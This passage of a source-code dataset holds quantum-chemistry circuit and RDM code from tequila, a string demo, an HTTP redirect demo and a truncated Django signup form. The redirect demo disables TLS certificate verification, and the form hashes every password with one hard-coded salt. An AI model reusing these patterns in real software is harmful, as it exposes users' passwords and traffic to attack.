label)\n            if include_doubles:\n                if  \"jordanwigner\" in self.transformation.name.lower() and not self.transformation.up_then_down:\n                    # we can optimize with qubit excitations for the JW representation\n                    target=[self.transformation.up(idx[0]), self.transformation.up(idx[1]), self.transformation.down(idx[0]), self.transformation.down(idx[1])]\n                    U += gates.QubitExcitation(angle=angle, target=target, assume_real=assume_real, **kwargs)\n                else:\n                    U += self.make_excitation_gate(angle=angle,\n                                                   indices=((2 * idx[0], 2 * idx[1]), (2 * idx[0] + 1, 2 * idx[1] + 1)),\n                                                   assume_real=assume_real, **kwargs)\n            if include_singles and mix_sd:\n                U += self.make_upccgsd_singles(indices=[idx], assume_real=assume_real, label=label,\n                                               spin_adapt_singles=spin_adapt_singles, angle_transform=angle_transform, neglect_z=neglect_z)\n\n        if include_singles and not mix_sd:\n            U += self.make_upccgsd_singles(indices=indices, assume_real=assume_real, label=label,\n                                           spin_adapt_singles=spin_adapt_singles, angle_transform=angle_transform, neglect_z=neglect_z)\n        return U\n\n    def make_upccgsd_singles(self, indices=\"UpCCGSD\", spin_adapt_singles=True, label=None, angle_transform=None,\n                             assume_real=True, neglect_z=False, *args, **kwargs):\n        if neglect_z and \"jordanwigner\" not in self.transformation.name.lower():\n            raise TequilaException(\"neglegt-z approximation in UpCCGSD singles needs the (Reversed)JordanWigner representation\")\n        if hasattr(indices, \"lower\"):\n            indices = self.make_upccgsd_indices(key=indices)\n\n        U = QCircuit()\n        for idx in indices:\n            assert len(idx) == 1\n            idx = idx[0]\n            if spin_adapt_singles:\n                angle = (idx, \"S\", label)\n                if angle_transform is not None:\n                    angle = angle_transform(angle)\n                if neglect_z:\n                    targeta=[self.transformation.up(idx[0]), self.transformation.up(idx[1])]\n                    targetb=[self.transformation.down(idx[0]), self.transformation.down(idx[1])]\n                    U += gates.QubitExcitation(angle=angle, target=targeta, assume_real=assume_real, **kwargs)\n                    U += gates.QubitExcitation(angle=angle, target=targetb, assume_real=assume_real, **kwargs)\n                else:\n                    U += self.make_excitation_gate(angle=angle, indices=[(2 * idx[0], 2 * idx[1])], assume_real=assume_real, **kwargs)\n                    U += self.make_excitation_gate(angle=angle, indices=[(2 * idx[0] + 1, 2 * idx[1] + 1)],\n                                               assume_real=assume_real, **kwargs)\n            else:\n                angle1 = (idx, \"SU\", label)\n                angle2 = (idx, \"SD\", label)\n                if angle_transform is not None:\n                    angle1 = angle_transform(angle1)\n                    angle2 = angle_transform(angle2)\n                if neglect_z:\n                    targeta=[self.transformation.up(idx[0]), self.transformation.up(idx[1])]\n                    targetb=[self.transformation.down(idx[0]), self.transformation.down(idx[1])]\n                    U += gates.QubitExcitation(angle=angle1, target=targeta, assume_real=assume_real, *kwargs)\n                    U += gates.QubitExcitation(angle=angle2, target=targetb, assume_real=assume_real, *kwargs)\n                else:\n                    U += self.make_excitation_gate(angle=angle1, indices=[(2 * idx[0], 2 * idx[1])],\n                                               assume_real=assume_real, **kwargs)\n                    U += self.make_excitation_gate(angle=angle2, indices=[(2 * idx[0] + 1, 2 * idx[1] + 1)],\n                                               assume_real=assume_real, **kwargs)\n\n        return U\n\n    def make_uccsd_ansatz(self, trotter_steps: int,\n                          initial_amplitudes: typing.Union[str, Amplitudes, ClosedShellAmplitudes] = \"mp2\",\n                          include_reference_ansatz=True,\n                          parametrized=True,\n                          threshold=1.e-8,\n                          *args, **kwargs) -> QCircuit:\n        \"\"\"\n\n        Parameters\n        ----------\n        initial_amplitudes :\n            initial amplitudes given as ManyBodyAmplitudes structure or as string\n            where 'mp2', 'cc2' or 'ccsd' are possible initializations\n        include_reference_ansatz :\n            Also do the reference ansatz (prepare closed-shell Hartree-Fock) (Default value = True)\n        parametrized :\n            Initialize with variables, otherwise with static numbers (Default value = True)\n        trotter_steps: int :\n\n        initial_amplitudes: typing.Union[str :\n\n        Amplitudes :\n\n        ClosedShellAmplitudes] :\n             (Default value = \"mp2\")\n\n        Returns\n        -------\n        type\n            Parametrized QCircuit\n\n        \"\"\"\n\n        if self.n_electrons % 2 != 0:\n            raise TequilaException(\"make_uccsd_ansatz currently only for closed shell systems\")\n\n        nocc = self.n_electrons // 2\n        nvirt = self.n_orbitals - nocc\n\n        Uref = QCircuit()\n        if include_reference_ansatz:\n            Uref = self.prepare_reference()\n\n        amplitudes = initial_amplitudes\n        if hasattr(initial_amplitudes, \"lower\"):\n            if initial_amplitudes.lower() == \"mp2\":\n                amplitudes = self.compute_mp2_amplitudes()\n            elif initial_amplitudes.lower() == \"ccsd\":\n                amplitudes = self.compute_ccsd_amplitudes()\n            else:\n                try:\n                    amplitudes = self.compute_amplitudes(method=initial_amplitudes.lower())\n                except Exception as exc:\n                    raise TequilaException(\n                        \"{}\\nDon't know how to initialize \\'{}\\' amplitudes\".format(exc, initial_amplitudes))\n\n        if amplitudes is None:\n            amplitudes = ClosedShellAmplitudes(\n                tIjAb=numpy.zeros(shape=[nocc, nocc, nvirt, nvirt]),\n                tIA=numpy.zeros(shape=[nocc, nvirt]))\n\n        closed_shell = isinstance(amplitudes, ClosedShellAmplitudes)\n        indices = []\n        variables = []\n\n        if not isinstance(amplitudes, dict):\n            amplitudes = amplitudes.make_parameter_dictionary(threshold=threshold)\n            amplitudes = dict(sorted(amplitudes.items(), key=lambda x: numpy.fabs(x[1]), reverse=True))\n\n        for key, t in amplitudes.items():\n            assert (len(key) % 2 == 0)\n            if not numpy.isclose(t, 0.0, atol=threshold):\n\n                if closed_shell:\n                    spin_indices = []\n                    if len(key) == 2:\n                        spin_indices = [[2 * key[0], 2 * key[1]], [2 * key[0] + 1, 2 * key[1] + 1]]\n                        partner = None\n                    else:\n                        spin_indices.append([2 * key[0] + 1, 2 * key[1] + 1, 2 * key[2], 2 * key[3]])\n                        #spin_indices.append([2 * key[0], 2 * key[1], 2 * key[2] + 1, 2 * key[3] + 1])\n                        if key[0] != key[2] and key[1] != key[3]:\n                            spin_indices.append([2 * key[0], 2 * key[1], 2 * key[2], 2 * key[3]])\n                            #spin_indices.append([2 * key[0] + 1, 2 * key[1] + 1, 2 * key[2] + 1, 2 * key[3] + 1])\n                        partner = tuple([key[2], key[1], key[0], key[3]])  # taibj -> tbiaj\n                    for idx in spin_indices:\n                        idx = [(idx[2 * i], idx[2 * i + 1]) for i in range(len(idx) // 2)]\n                        indices.append(idx)\n\n                    if parametrized:\n                        variables.append(2.0*Variable(name=key))  # abab\n                        #variables.append(Variable(name=key))  # baba\n                        if partner is not None and key[0] != key[1] and key[2] != key[3]:\n                            variables.append(2.0*(Variable(name=key) - Variable(partner))) # aaaa\n                            #variables.append(Variable(name=key) - Variable(partner))  # bbbb\n                    else:\n                        variables.append(2.0*t)\n                        #variables.append(t)\n                        if partner is not None and key[0] != key[1] and key[2] != key[3]:\n                            variables.append(2.0*(t - amplitudes[partner]))\n                            #variables.append(t - amplitudes[partner])\n                else:\n                    indices.append(spin_indices)\n                    if parametrized:\n                        variables.append(Variable(name=key))\n                    else:\n                        variables.append(t)\n        UCCSD = QCircuit()\n        factor = 1.0 / trotter_steps\n        for step in range(trotter_steps):\n            for i, idx in enumerate(indices):\n                UCCSD += self.make_excitation_gate(indices=idx, angle=factor * variables[i])\n\n        return Uref + UCCSD\n\n    def compute_amplitudes(self, method: str, *args, **kwargs):\n        \"\"\"\n        Compute closed-shell CC amplitudes\n\n        Parameters\n        ----------\n        method :\n            coupled-cluster methods like cc2, ccsd, cc3, ccsd(t)\n            Success might depend on backend\n            got an extra function for MP2\n        *args :\n\n        **kwargs :\n\n\n        Returns\n        -------\n\n        \"\"\"\n        raise TequilaException(\"compute amplitudes: Needs to be overwritten by backend\")\n\n    def compute_mp2_amplitudes(self) -> ClosedShellAmplitudes:\n        \"\"\"\n\n        Compute closed-shell mp2 amplitudes\n\n        .. math::\n            t(a,i,b,j) = 0.25 * g(a,i,b,j)/(e(i) + e(j) -a(i) - b(j) )\n\n        :return:\n\n        Parameters\n        ----------\n\n        Returns\n        -------\n\n        \"\"\"\n        assert self.parameters.closed_shell\n        g = self.molecule.two_body_integrals\n        fij = self.molecule.orbital_energies\n        nocc = self.molecule.n_electrons // 2  # this is never the active space\n        ei = fij[:nocc]\n        ai = fij[nocc:]\n        abgij = g[nocc:, nocc:, :nocc, :nocc]\n        amplitudes = abgij * 1.0 / (\n                ei.reshape(1, 1, -1, 1) + ei.reshape(1, 1, 1, -1) - ai.reshape(-1, 1, 1, 1) - ai.reshape(1, -1, 1, 1))\n        E = 2.0 * numpy.einsum('abij,abij->', amplitudes, abgij) - numpy.einsum('abji,abij', amplitudes, abgij,\n                                                                                optimize='greedy')\n\n        self.molecule.mp2_energy = E + self.molecule.hf_energy\n        return ClosedShellAmplitudes(tIjAb=numpy.einsum('abij -> ijab', amplitudes, optimize='greedy'))\n\n    def compute_cis_amplitudes(self):\n        \"\"\"\n        Compute the CIS amplitudes of the molecule\n        \"\"\"\n\n        @dataclass\n        class ResultCIS:\n            \"\"\" \"\"\"\n            omegas: typing.List[numbers.Real]  # excitation energies [omega0, ...]\n            amplitudes: typing.List[ClosedShellAmplitudes]  # corresponding amplitudes [x_{ai}_0, ...]\n\n            def __getitem__(self, item):\n                return (self.omegas[item], self.amplitudes[item])\n\n            def __len__(self):\n                return len(self.omegas)\n\n        g = self.molecule.two_body_integrals\n        fij = self.molecule.orbital_energies\n\n        nocc = self.n_alpha_electrons\n        nvirt = self.n_orbitals - nocc\n\n        pairs = []\n        for i in range(nocc):\n            for a in range(nocc, nocc + nvirt):\n                pairs.append((a, i))\n        M = numpy.ndarray(shape=[len(pairs), len(pairs)])\n\n        for xx, x in enumerate(pairs):\n            eia = fij[x[0]] - fij[x[1]]\n            a, i = x\n            for yy, y in enumerate(pairs):\n                b, j = y\n                delta = float(y == x)\n                gpart = 2.0 * g[a, i, b, j] - g[a, i, j, b]\n                M[xx, yy] = eia * delta + gpart\n\n        omega, xvecs = numpy.linalg.eigh(M)\n\n        # convert amplitudes to ndarray sorted by excitation energy\n        nex = len(omega)\n        amplitudes = []\n        for ex in range(nex):\n            t = numpy.ndarray(shape=[nvirt, nocc])\n            exvec = xvecs[ex]\n            for xx, x in enumerate(pairs):\n                a, i = x\n                t[a - nocc, i] = exvec[xx]\n            amplitudes.append(ClosedShellAmplitudes(tIA=t))\n\n        return ResultCIS(omegas=list(omega), amplitudes=amplitudes)\n\n    @property\n    def rdm1(self):\n        \"\"\" \"\"\"\n        if self._rdm1 is not None:\n            return self._rdm1\n        else:\n            print(\"1-RDM has not been computed. Return None for 1-RDM.\")\n            return None\n\n    @property\n    def rdm2(self):\n        \"\"\" \"\"\"\n        if self._rdm2 is not None:\n            return self._rdm2\n        else:\n            print(\"2-RDM has not been computed. Return None for 2-RDM.\")\n            return None\n\n    def compute_rdms(self, U: QCircuit = None, variables: Variables = None, spin_free: bool = True,\n                     get_rdm1: bool = True, get_rdm2: bool = True):\n        \"\"\"\n        Computes the one- and two-particle reduced density matrices (rdm1 and rdm2) given\n        a unitary U. This method uses the standard ordering in physics as denoted below.\n        Note, that the representation of the density matrices depends on the qubit transformation\n        used. The Jordan-Wigner encoding corresponds to 'classical' second quantized density\n        matrices in the occupation picture.\n\n        We only consider real orbitals and thus real-valued RDMs.\n        The matrices are set as private members _rdm1, _rdm2 and can be accessed via the properties rdm1, rdm2.\n\n        .. math :\n            \\\\text{rdm1: } \\\\gamma^p_q = \\\\langle \\\\psi | a^p a_q | \\\\psi \\\\rangle\n                                     = \\\\langle U 0 | a^p a_q | U 0 \\\\rangle\n            \\\\text{rdm2: } \\\\gamma^{pq}_{rs} = \\\\langle \\\\psi | a^p a^q a_s a_r | \\\\psi \\\\rangle\n                                             = \\\\langle U 0 | a^p a^q a_s a_r | U 0 \\\\rangle\n\n        Parameters\n        ----------\n        U :\n            Quantum Circuit to achieve the desired state \\\\psi = U |0\\\\rangle, non-optional\n        variables :\n            If U is parametrized, then need to hand over a set of fixed variables\n        spin_free :\n            Set whether matrices should be spin-free (summation over spin) or defined by spin-orbitals\n        get_rdm1, get_rdm2 :\n            Set whether either one or both rdm1, rdm2 should be computed. If both are needed at some point,\n            it is recommended to compute them at once.\n\n        Returns\n        -------\n        \"\"\"\n        # Check whether unitary circuit is not 0\n        if U is None:\n            raise TequilaException('Need to specify a Quantum Circuit.')\n\n        # Check whether transformation is BKSF.\n        # Issue here: when a single operator acts only on a subset of qubits, BKSF might not yield the correct\n        # transformation, because it computes the number of qubits incorrectly in this case.\n        # A hotfix such as for symmetry_conserving_bravyi_kitaev would require deeper changes, thus omitted for now\n        if type(self.transformation).__name__ == \"BravyiKitaevFast\":\n            raise TequilaException(\n                \"The Bravyi-Kitaev-Superfast transformation does not support general FermionOperators yet.\")\n\n        # Set up number of spin-orbitals and molecular orbitals respectively\n        n_SOs = 2 * self.n_orbitals\n        n_MOs = self.n_orbitals\n\n        # Check whether unitary circuit is not 0\n        if U is None:\n            raise TequilaException('Need to specify a Quantum Circuit.')\n\n        def _get_of_op(operator_tuple):\n            \"\"\" Returns operator given by a operator tuple as OpenFermion - Fermion operator \"\"\"\n            op = openfermion.FermionOperator(operator_tuple)\n            return op\n\n        def _get_qop_hermitian(of_operator) -> QubitHamiltonian:\n            \"\"\" Returns Hermitian part of Fermion operator as QubitHamiltonian \"\"\"\n            qop = self.transformation(of_operator)\n            #qop = QubitHamiltonian(self.transformation(of_operator))\n            real, imag = qop.split(hermitian=True)\n            if real:\n                return real\n            elif not real:\n                raise TequilaException(\n                    \"Qubit Hamiltonian does not have a Hermitian part. Operator ={}\".format(of_operator))\n\n        def _build_1bdy_operators_spinful() -> list:\n            \"\"\" Returns spinful one-body operators as a symmetry-reduced list of QubitHamiltonians \"\"\"\n            # Exploit symmetry pq = qp\n            ops = []\n            for p in range(n_SOs):\n                for q in range(p + 1):\n                    op_tuple = ((p, 1), (q, 0))\n                    op = _get_of_op(op_tuple)\n                    ops += [op]\n\n            return ops\n\n        def _build_2bdy_operators_spinful() -> list:\n            \"\"\" Returns spinful two-body operators as a symmetry-reduced list of QubitHamiltonians \"\"\"\n            # Exploit symmetries pqrs = -pqsr = -qprs = qpsr\n            #                and      =  rspq\n            ops = []\n            for p in range(n_SOs):\n                for q in range(p):\n                    for r in range(n_SOs):\n                        for s in range(r):\n                            if p * n_SOs + q >= r * n_SOs + s:\n                                op_tuple = ((p, 1), (q, 1), (s, 0), (r, 0))\n                                op = _get_of_op(op_tuple)\n                                ops += [op]\n\n            return ops\n\n        def _build_1bdy_operators_spinfree() -> list:\n            \"\"\" Returns spinfree one-body operators as a symmetry-reduced list of QubitHamiltonians \"\"\"\n            # Exploit symmetry pq = qp (not changed by spin-summation)\n            ops = []\n            for p in range(n_MOs):\n                for q in range(p + 1):\n                    # Spin aa\n                    op_tuple = ((2 * p, 1), (2 * q, 0))\n                    op = _get_of_op(op_tuple)\n                    # Spin bb\n                    op_tuple = ((2 * p + 1, 1), (2 * q + 1, 0))\n                    op += _get_of_op(op_tuple)\n                    ops += [op]\n\n            return ops\n\n        def _build_2bdy_operators_spinfree() -> list:\n            \"\"\" Returns spinfree two-body operators as a symmetry-reduced list of QubitHamiltonians \"\"\"\n            # Exploit symmetries pqrs = qpsr (due to spin summation, '-pqsr = -qprs' drops out)\n            #                and      = rspq\n            ops = []\n            for p, q, r, s in product(range(n_MOs), repeat=4):\n                if p * n_MOs + q >= r * n_MOs + s and (p >= q or r >= s):\n                    # Spin aaaa\n                    op_tuple = ((2 * p, 1), (2 * q, 1), (2 * s, 0), (2 * r, 0)) if (p != q and r != s) else '0.0 []'\n                    op = _get_of_op(op_tuple)\n                    # Spin abab\n                    op_tuple = ((2 * p, 1), (2 * q + 1, 1), (2 * s + 1, 0), (2 * r, 0)) if (\n                            2 * p != 2 * q + 1 and 2 * r != 2 * s + 1) else '0.0 []'\n                    op += _get_of_op(op_tuple)\n                    # Spin baba\n                    op_tuple = ((2 * p + 1, 1), (2 * q, 1), (2 * s, 0), (2 * r + 1, 0)) if (\n                            2 * p + 1 != 2 * q and 2 * r + 1 != 2 * s) else '0.0 []'\n                    op += _get_of_op(op_tuple)\n                    # Spin bbbb\n                    op_tuple = ((2 * p + 1, 1), (2 * q + 1, 1), (2 * s + 1, 0), (2 * r + 1, 0)) if (\n                            p != q and r != s) else '0.0 []'\n                    op += _get_of_op(op_tuple)\n\n                    ops += [op]\n\n            return ops\n\n        def _assemble_rdm1(evals) -> numpy.ndarray:\n            \"\"\"\n            Returns spin-ful or spin-free one-particle RDM built by symmetry conditions\n            Same symmetry with or without spin, so we can use the same function\n            \"\"\"\n            N = n_MOs if spin_free else n_SOs\n            rdm1 = numpy.zeros([N, N])\n            ctr: int = 0\n            for p in range(N):\n                for q in range(p + 1):\n                    rdm1[p, q] = evals[ctr]\n                    # Symmetry pq = qp\n                    rdm1[q, p] = rdm1[p, q]\n                    ctr += 1\n\n            return rdm1\n\n        def _assemble_rdm2_spinful(evals) -> numpy.ndarray:\n            \"\"\" Returns spin-ful two-particle RDM built by symmetry conditions \"\"\"\n            ctr: int = 0\n            rdm2 = numpy.zeros([n_SOs, n_SOs, n_SOs, n_SOs])\n            for p in range(n_SOs):\n                for q in range(p):\n                    for r in range(n_SOs):\n                        for s in range(r):\n                            if p * n_SOs + q >= r * n_SOs + s:\n                                rdm2[p, q, r, s] = evals[ctr]\n                                # Symmetry pqrs = rspq\n                                rdm2[r, s, p, q] = rdm2[p, q, r, s]\n                                ctr += 1\n\n            # Further permutational symmetries due to anticommutation relations\n            for p in range(n_SOs):\n                for q in range(p):\n                    for r in range(n_SOs):\n                        for s in range(r):\n                            rdm2[p, q, s, r] = -1 * rdm2[p, q, r, s]  # pqrs = -pqsr\n                            rdm2[q, p, r, s] = -1 * rdm2[p, q, r, s]  # pqrs = -qprs\n                            rdm2[q, p, s, r] = rdm2[p, q, r, s]  # pqrs =  qpsr\n\n            return rdm2\n\n        def _assemble_rdm2_spinfree(evals) -> numpy.ndarray:\n            \"\"\" Returns spin-free two-particle RDM built by symmetry conditions \"\"\"\n            ctr: int = 0\n            rdm2 = numpy.zeros([n_MOs, n_MOs, n_MOs, n_MOs])\n            for p, q, r, s in product(range(n_MOs), repeat=4):\n                if p * n_MOs + q >= r * n_MOs + s and (p >= q or r >= s):\n                    rdm2[p, q, r, s] = evals[ctr]\n                    # Symmetry pqrs = rspq\n                    rdm2[r, s, p, q] = rdm2[p, q, r, s]\n                    ctr += 1\n\n            # Further permutational symmetry: pqrs = qpsr\n            for p, q, r, s in product(range(n_MOs), repeat=4):\n                if p >= q or r >= s:\n                    rdm2[q, p, s, r] = rdm2[p, q, r, s]\n\n            return rdm2\n\n        # Build operator lists\n        qops = []\n        if spin_free:\n            qops += _build_1bdy_operators_spinfree() if get_rdm1 else []\n            qops += _build_2bdy_operators_spinfree() if get_rdm2 else []\n        else:\n            qops += _build_1bdy_operators_spinful() if get_rdm1 else []\n            qops += _build_2bdy_operators_spinful() if get_rdm2 else []\n\n        # Transform operator lists to QubitHamiltonians\n        qops = [_get_qop_hermitian(op) for op in qops]\n        # Compute expected values\n        evals = simulate(ExpectationValue(H=qops, U=U, shape=[len(qops)]), variables=variables)\n\n        # Assemble density matrices\n        # If self._rdm1, self._rdm2 exist, reset them if they are of the other spin-type\n        def _reset_rdm(rdm):\n            if rdm is not None:\n                if spin_free and rdm.shape[0] != n_MOs:\n                    return None\n                if not spin_free and rdm.shape[0] != n_SOs:\n                    return None\n            return rdm\n\n        self._rdm1 = _reset_rdm(self._rdm1)\n        self._rdm2 = _reset_rdm(self._rdm2)\n        # Split expectation values in 1- and 2-particle expectation values\n        if get_rdm1:\n            len_1 = n_MOs * (n_MOs + 1) // 2 if spin_free else n_SOs * (n_SOs + 1) // 2\n        else:\n            len_1 = 0\n        evals_1, evals_2 = evals[:len_1], evals[len_1:]\n        # Build matrices using the expectation values\n        self._rdm1 = _assemble_rdm1(evals_1) if get_rdm1 else self._rdm1\n        if spin_free:\n            self._rdm2 = _assemble_rdm2_spinfree(evals_2) if get_rdm2 else self._rdm2\n        else:\n            self._rdm2 = _assemble_rdm2_spinful(evals_2) if get_rdm2 else self._rdm2\n\n    def rdm_spinsum(self, sum_rdm1: bool = True, sum_rdm2: bool = True) -> tuple:\n        \"\"\"\n        Given the spin-ful 1- and 2-particle reduced density matrices, compute the spin-free RDMs by spin summation.\n\n        Parameters\n        ----------\n            sum_rdm1, sum_rdm2 :\n               If set to true, perform spin summation on rdm1, rdm2\n\n        Returns\n        -------\n            rdm1_spinsum, rdm2_spinsum :\n                The desired spin-free matrices\n        \"\"\"\n        n_MOs = self.n_orbitals\n        rdm1_spinsum = None\n        rdm2_spinsum = None\n\n        # Spin summation on rdm1\n        if sum_rdm1:\n            # Check whether spin-rdm2 exists\n            if self._rdm1 is None:\n                raise TequilaException(\"The spin-RDM for the 1-RDM does not exist!\")\n            # Check whether existing rdm1 is in spin-orbital basis\n            if self._rdm1.shape[0] != 2 * n_MOs:\n                raise TequilaException(\"The existing RDM needs to be in spin-orbital basis, it is already spin-free!\")\n            # Do summation\n            rdm1_spinsum = numpy.zeros([n_MOs, n_MOs])\n            for p in range(n_MOs):\n                for q in range(p + 1):\n                    rdm1_spinsum[p, q] += self._rdm1[2 * p, 2 * q]\n                    rdm1_spinsum[p, q] += self._rdm1[2 * p + 1, 2 * q + 1]\n            for p in range(n_MOs):\n                for q in range(p):\n                    rdm1_spinsum[q, p] = rdm1_spinsum[p, q]\n\n        # Spin summation on rdm2\n        if sum_rdm2:\n            # Check whether spin-rdm2 exists\n            if self._rdm2 is None:\n                raise TequilaException(\"The spin-RDM for the 2-RDM does not exist!\")\n            # Check whether existing rdm2 is in spin-orbital basis\n            if self._rdm2.shape[0] != 2 * n_MOs:\n                raise TequilaException(\"The existing RDM needs to be in spin-orbital basis, it is already spin-free!\")\n            # Do summation\n            rdm2_spinsum = numpy.zeros([n_MOs, n_MOs, n_MOs, n_MOs])\n            for p, q, r, s in product(range(n_MOs), repeat=4):\n                rdm2_spinsum[p, q, r, s] += self._rdm2[2 * p, 2 * q, 2 * r, 2 * s]\n                rdm2_spinsum[p, q, r, s] += self._rdm2[2 * p + 1, 2 * q, 2 * r + 1, 2 * s]\n                rdm2_spinsum[p, q, r, s] += self._rdm2[2 * p, 2 * q + 1, 2 * r, 2 * s + 1]\n                rdm2_spinsum[p, q, r, s] += self._rdm2[2 * p + 1, 2 * q + 1, 2 * r + 1, 2 * s + 1]\n\n        return rdm1_spinsum, rdm2_spinsum\n\n    def perturbative_f12_correction(self, rdm1: numpy.ndarray = None, rdm2: numpy.ndarray = None,\n                                    gamma: float = 1.4, n_ri: int = None,\n                                    external_info: dict = None, **kwargs) -> float:\n        \"\"\"\n        Computes the spin-free [2]_R12 correction, needing only the 1- and 2-RDM of a reference method\n        Requires either 1-RDM, 2-RDM or information to compute them in kwargs\n\n        Parameters\n        ----------\n        rdm1 :\n            1-electron reduced density matrix\n        rdm2 :\n            2-electron reduced density matrix\n        gamma :\n            f12-exponent, for a correlation factor f_12 = -1/gamma * exp[-gamma*r_12]\n        n_ri :\n            dimensionality of RI-basis; specify only, if want to truncate available RI-basis\n            if None, then the maximum available via tensors / basis-set is used\n            must not be larger than size of available RI-basis, and not smaller than size of OBS\n            for n_ri==dim(OBS), the correction returns zero\n        external_info :\n            for usage in qc_base, need to provide information where to find one-body tensor f12-tensor <rs|f_12|pq>;\n            pass dictionary with {\"f12_filename\": where to find f12-tensor, \"scheme\": ordering scheme of tensor}\n        kwargs :\n            e.g. RDM-information via {\"U\": QCircuit, \"variables\": optimal angles}, needs to be passed if rdm1,rdm2 not\n            yet computed\n\n        Returns\n        -------\n            the f12 correction for the energy\n        \"\"\"\n        from .f12_corrections._f12_correction_base import ExplicitCorrelationCorrection\n        correction = ExplicitCorrelationCorrection(mol=self, rdm1=rdm1, rdm2=rdm2, gamma=gamma,\n                                                   n_ri=n_ri, external_info=external_info, **kwargs)\n        return correction.compute()\n\n    def __str__(self) -> str:\n        result = str(type(self)) + \"\\n\"\n        result += \"Qubit Encoding\\n\"\n        result += str(self.transformation) + \"\\n\\n\"\n        result += \"Parameters\\n\"\n        for k, v in self.parameters.__dict__.items():\n            result += \"{key:15} : {value:15} \\n\".format(key=str(k), value=str(v))\n        result += \"\\n\"\n        return result\n"}
{"blob_id": "44879036ea3ad96f28d9dc2d826d83c0259efae1", "directory_id": "64168c0ecc7c537013974cbd78ee3db45a889b2c", "path": "/isalnum.py", "content_id": "1d073634c7f6557a5982102a95603e0ba2e5b167", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "rahul1907935/Strings-and-Lists", "snapshot_id": "65f003d0e45cc8ec2eaeac53ac222f4fe8160643", "revision_id": "54fb1a9c22a90eb7ff115407dd855a5ff0f55333", "branch_name": "refs/heads/main", "visit_date": "2023-07-09 05:35:03.436207", "revision_date": "2021-08-15 07:16:39", "committer_date": "2021-08-15 07:16:39", "github_id": "396256400", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "140", "extension": "py", "content": "# -*- coding: utf-8 -*-\r\n\"\"\"\r\nCreated on Sun Aug 15 11:41:42 2021\r\n\r\n@author: rahul\r\n\"\"\"\r\n\r\ntxt = \"Sector8\"\r\n\r\nx = txt.isalnum()\r\n\r\nprint(x)"}
{"blob_id": "65a98389f33d0bbae17df8db7a4e5308f11cc786", "directory_id": "722e92bccceb5140ab00e1a3383ed34807ca139f", "path": "/redirectDemo.py", "content_id": "649f30b0ec4b85ce78e5b02aa7c97bfa40306886", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "WangLingxing/Exercise", "snapshot_id": "40944ffcd2d701b164f9cbb4e0413f4a2e13fd12", "revision_id": "f0a8c380d20c73bc11fbe0de72c01f8ec94edc38", "branch_name": "refs/heads/master", "visit_date": "2021-09-13 19:04:08.896276", "revision_date": "2018-05-03 09:08:58", "committer_date": "2018-05-03 09:08:58", "github_id": "86770523", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "358", "extension": "py", "content": "#-*-coding:utf-8-*-\nimport requests\n#\u8bf7\u6c42\u5934\nheaders = {\"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:44.0) Gecko/20100101 Firefox/44.0\"}\ns = requests.session()\n\nr = s.get(\"https://i.cnblogs.com/EditPosts.aspx?opt=1\",\n\theaders = headers,\n\tallow_redirects = True,\n\tverify = False)\n\nprint r.status_code\n\nnew_url = r.headers[\"Location\"]\nprint new_url"}
{"blob_id": "c5fdcd22e21025063efea599ba0714cddfa36930", "directory_id": "d08c590bcd67d48db741125f78779fca238ef3ba", "path": "/accounts/forms.py", "content_id": "6107982eafcbc10a13a68f3497b4e7e074214b1a", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "CoreyGumbs/ibhuku.com-web", "snapshot_id": "ec26593258b71391009f56a3fe4787450260c9b3", "revision_id": "b6ea0e2186154f4ca56a4c3d1cc7aa0901d3e8e5", "branch_name": "refs/heads/master", "visit_date": "2021-06-10 10:14:09.779400", "revision_date": "2017-01-31 06:17:10", "committer_date": "2017-01-31 06:17:10", "github_id": "None", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "2348", "extension": "py", "content": "from django import forms\nfrom django.forms import ModelForm\nfrom django.utils.translation import ugettext_lazy as _\nfrom django.contrib.auth.hashers import make_password\nfrom django.core.validators import validate_email\n\nfrom crispy_forms.helper import FormHelper\nfrom crispy_forms.layout import Layout, Fieldset, Submit, Button, Reset\nfrom crispy_forms.bootstrap import FormActions, PrependedText\n\nfrom .models import IbkUser, Profile\n\n\nclass IbkUserSignUpForm(ModelForm):\n\n\tclass Meta:\n\t\tmodel = IbkUser\n\t\tfields = ('name', 'email', 'password')\n\t\tfields_required = ('name')\n\t\twidgets = {\n\t\t\t'name': forms.TextInput(attrs={'id': 'signup_name'}),\n\t\t\t'email': forms.EmailInput(attrs={'id': 'signup_email'}),\n\t\t\t'password': forms.PasswordInput(attrs={'id': 'signup_password', 'placeholder': ' Enter Password'})\n\t\t}\n\n\tdef clean_password(self):\n\t\tpassword = self.cleaned_data.get('password')\n\t\tif len(password) < 8:\n\t\t\traise forms.ValidationError('Password must be at least 8 characters.')\n\t\telse:\n\t\t\tpassword_hashed =  make_password(password, salt='jRkSlAw7KZ')\n\t\t\treturn password_hashed\n\n\tdef __init__(self, *args, **kwargs):\n\t\tsuper(IbkUserSignUpForm, self).__init__(*args, **kwargs)\n\t\tself.helper = FormHelper()\n\t\tself.helper.form_id = 'registerForm'\n\t\tself.helper.form_method = 'post'\n\t\tself.helper.layout = Layout(\n\t\t\t\tPrependedText('name', \"<span class='glyphicon glyphicon-user'></span>\", placeholder=\"Name\", active=True),\n\t\t\t\tPrependedText('email', \"<span class='glyphicon glyphicon-envelope'></span>\", placeholder=\"Email\", active=True),\n\t\t\t\tPrependedText('password', \"<span class='glyphicon glyphicon-lock'></span>\", placeholder=\"Password\", active=True),\n\t\t\t\tFormActions(\n\t\t\t\t\tSubmit('submit', 'Submit', css_class ='btn btn-success btn-lg btn-block'),\n\t\t\t\t\t),\n\t\t\t)\n\nclass ResetActivationLinkForm(forms.Form):\n\temail = forms.EmailField(label='Email', max_length=255, required=True)\n\n\tdef __init__(self, *args, **kwargs):\n\t\tsuper(ResetActivationLinkForm, self).__init__(*args, 